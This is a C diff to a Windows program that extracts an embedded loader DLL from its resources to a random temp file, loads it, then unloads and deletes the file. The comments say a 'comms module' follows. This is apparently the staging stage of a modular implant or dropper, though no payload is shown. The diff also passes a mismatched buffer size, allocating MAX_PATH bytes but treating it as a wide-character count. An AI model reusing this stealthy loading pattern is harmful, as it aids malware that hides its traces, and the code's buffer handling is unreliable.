@@ -12,7 +12,25 @@ wmain(INT argc, PWSTR argv[])
 	*	1. Load embedded modules from resources
 	*	2. Load comms module using loader
 	*/
-	LoadEmbeddedLoader();
+	LOADED_MODULE lmLoader = { 0 };
+	
+	LoadEmbeddedLoader(&lmLoader);
+
+	if (lmLoader.hModule &&
+			FALSE == FreeLibrary(lmLoader.hModule))
+	{
+		LOG_ERROR("FreeLibrary failed");
+	}
+
+	if (lmLoader.pwszModuleFileName &&
+			FALSE == DeleteFileW(lmLoader.pwszModuleFileName))
+	{
+		LOG_ERROR("DeleteFile failed");
+	}
+
+	HeapFree(GetProcessHeap(), 0, lmLoader.pwszModuleFileName);
+
+	ZeroMemory(&lmLoader, sizeof(lmLoader));
 
 	return EXIT_SUCCESS;
 }
@@ -84,16 +102,29 @@ GetRandomTempFileNameW(
 
 BOOL
 LoadEmbeddedLoader(
-	VOID)
+	PLOADED_MODULE pLoadedModule)
 {
 	HRSRC hrsrcLoader = NULL;
 	HGLOBAL hgLoader = NULL;
 	PVOID lpLoaderData = NULL;
-	DWORD dwLoaderSize = 0;
-	WCHAR awcTempFileName[MAX_PATH] = { 0 };
+	DWORD dwLoaderSize = 0, dwTempFileNameLen = MAX_PATH;
+	PWSTR pwszTempFileName = NULL;
 	HMODULE hmLoader = NULL;
 
-	if (FALSE == GetRandomTempFileNameW(awcTempFileName, _countof(awcTempFileName)))
+	if (!pLoadedModule)
+	{
+		LOG_ERROR("Invalid parameter");
+		return FALSE;
+	}
+
+	pwszTempFileName = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwTempFileNameLen);
+	if (NULL == pwszTempFileName)
+	{
+		LOG_ERROR("HeapAlloc failed");
+		return FALSE;
+	}
+
+	if (FALSE == GetRandomTempFileNameW(pwszTempFileName, dwTempFileNameLen))
 	{
 		LOG_ERROR("GetTempFileName failed");
 		return FALSE;
@@ -127,14 +158,14 @@ LoadEmbeddedLoader(
 		return FALSE;
 	}
 
-	if (FALSE == WriteDataToFile(awcTempFileName, lpLoaderData, dwLoaderSize))
+	if (FALSE == WriteDataToFile(pwszTempFileName, lpLoaderData, dwLoaderSize))
 	{
 		return FALSE;
 	}
 
 	UnlockResource(hgLoader);
 
-	hmLoader = LoadLibraryW(awcTempFileName);
+	hmLoader = LoadLibraryW(pwszTempFileName);
 	if (NULL == hmLoader)
 	{
 		LOG_ERROR("LoadLibrary failed");
@@ -143,6 +174,9 @@ LoadEmbeddedLoader(
 	{
 		LOG_MSG("LoadLibrary success");
 	}
+
+	pLoadedModule->hModule = hmLoader;
+	pLoadedModule->pwszModuleFileName = pwszTempFileName;
 
 	return TRUE;
 }
